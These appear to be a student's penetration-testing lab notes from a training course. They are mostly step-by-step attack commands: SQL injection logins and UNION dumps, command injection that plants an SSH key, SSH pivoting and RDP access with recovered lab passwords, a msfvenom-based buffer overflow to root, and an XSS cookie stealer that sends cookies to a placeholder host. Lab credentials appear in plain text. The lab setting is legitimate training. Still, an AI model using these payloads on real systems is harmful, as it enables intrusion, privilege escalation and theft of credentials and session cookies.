
# Penetration Testing Lab Notes

## Stack Number	    Username	                  Password	                  jump
   2 	              AUCL-M-503 	                h0SGfv8QuA6C 	              10.50.12.54

---

## Lab Setup

### Jump Box Connection
```bash
ssh demo1@10.50.14.253 -L 1111:10.208.50.61:80
Browse: http://127.0.0.1:1111/classinfo

Credentials
Username:
Password:gXliXVXVuULy
Phase 1: Initial Enumeration (PublicFacingWebsite)
Target Details
IP:10.50.16.50
Open Ports: 22, 53, 80
Nmap Enumeration
nmap -Pn -T5 -sT -p 80 --script http-enum.nse 10.50.16.50
nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse 10.50.16.50
nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse 10.50.16.50
Key Findings
/login.html — Vulnerable login page (admin folder suspected)
SQL Injection in username field
' OR 1='1 works in both username and password fields
Command injection possible via "Decode String" prompt
Command Injection Discovery
; whoami                    # www-data
; cat /etc/passwd
; ls -la /var/www
Important: www-data home directory = /var/www

Phase 2: Gaining Initial Access (SSH Key Upload)
1. Generate SSH Key (on Linops)
ssh-keygen -t rsa -b 4096     # No passphrase
cat ~/.ssh/id_rsa.pub
2. Upload Key via Command Injection
; mkdir -p /var/www/.ssh
; ls -la /var/www
; echo "ssh-rsa AAAAB3NzaC1yc2E... (your full public key)" > /var/www/.ssh/authorized_keys
; cat /var/www/.ssh/authorized_keys
3. SSH as www-data
ssh www-data@10.50.16.50
Post-Access Checks:

ip addr                       # 10.10.28.20/27
sudo -l                       # Can run /var/tmp/exploit_me
bash                          # Proper shell
Phase 3: Pivoting & Internal Network Discovery
Dynamic SOCKS Proxy
ssh www-data@10.50.16.50 -D 9050 2>/dev/null
proxychains nmap -Pn -T4 192.168.28.175
Local Port Forwarding Example
ssh www-data@10.50.16.50 -L 10601:192.168.28.175:8000
firefox http://127.0.0.1:10601
Ping Sweep Commands
# From www-data
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null; done

# From user3@RoundSensor
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null; done
Discovered Hosts
192.168.28.165 → Ports 22, 8888
192.168.28.189 → Ports 22, 135, 139, 445, 3389, 5357, 9999
Accessing RoundSensor (user3)
ssh www-data@10.50.16.50 -L 10605:192.168.28.165:22
ssh user3@localhost -p 10605          # Password: Bob4THEPin3apples
Standard Checks on New Systems:

cat /etc/passwd
cat /etc/hosts
Accessing Windows Workstation (Aaron)
ssh user3@localhost -p 10605 -L 10606:192.168.28.189:3389
xfreerdp /u:Aaron /p:appleBottomJ3an$ /v:localhost:10606 /cert-ignore
Phase 4: SQL Injection (GET Method)
Vulnerable Parameter: ?product=

Steps
?product=7 OR 1=1
?product=7 UNION SELECT 1,2,@@version
?product=7 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
Golden Statement:

UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
Successful Dump:

?product=7 UNION SELECT user_id,name,username FROM siteusers.users
Credentials (ROT13 decoded):

Aaron → appleBottomJ3an$
user2 → TurkeyDay24
user3 → Bob4THEPin3apples (Working)
Lee_Roth → Lroth / anotherpassword4THEages
Phase 5: Linux Buffer Overflow (On Target System Only!)
Critical: All steps must be performed on the target machine.

Workflow
Run in GDB: gdb exploit_me
Generate pattern (length 100) on wiremask.eu
Find EIP offset
Create exploit script (/tmp/exploit.py)
Clean environment:
env - gdb exploit_me
unset env LINES
unset env COLUMNS
Find jmp esp:
find /b <heap_end>, <stack_start>, 0xff, 0xe4
(Convert to little-endian for exploit)
Generate shellcode:
msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00' -f python
Run final exploit:
sudo ./exploit_me $(python exploit.py)
Success Indicator: Root shell (# whoami → root)

SSH Tunneling & Master Sockets
Master Socket Creation
ssh -MS /tmp/jump user@ip
Dynamic Proxy
ssh -S /tmp/jump jump -O forward -D 9050
Local Forward
ssh -S /tmp/jump jump -O forward -L 1111:internal_ip:80
Cancel Forward
ssh -S /tmp/jump jump -O cancel -L 1111:internal_ip:80
Verify Connections:

ss -antlp
Web Exploitation Techniques
Command Injection:; whoami | ; cat /etc/passwd
Directory Traversal:../../../../../../etc/passwd
XSS Cookie Stealer:
<script>document.location="http://YOUR_IP:PORT/?c="+document.cookie;</script>
Malicious File Upload:503.png.php
SQL Injection Reference
Basic Steps
' OR 1='1 — Find vulnerable field
UNION SELECT 1,2,3,... — Count columns
Golden Statement — Enumerate schema
Targeted dump from user tables
GET Example:

?product=7 UNION SELECT 1,2,username,password FROM siteusers.users
Linux Privilege Escalation
sudo -l
find / -type f -perm -4000 -ls 2>/dev/null     # SUID
find / -type f -perm -6000 -ls 2>/dev/null     # SUID/SGID
Tool: GTFOBins

Common Checks:

whoami && id && groups
uname -a && cat /etc/*release*
ls -la /tmp /var/www /home
Check cron jobs, logs, and .ssh keys
Post-Exploitation Enumeration
Linux
ip addr
ss -antp
ps -ef
ls -la /etc/cron* /var/log
Windows
systeminfo
net user
tasklist /svc
ipconfig /all
Target Tasking Overview
PublicFacingWebsite — Web recon, initial access, pivot
BestWebApp — Additional web exploitation
RoundSensor — Linux priv esc + further pivoting
Windows-Workstation — RDP access + Windows techniques
Pro Tips:

Always use ls -la
Never close terminals with active SSH master sockets
Document every new IP, credential, and port immediately
Use Master Sockets for clean, reliable pivoting
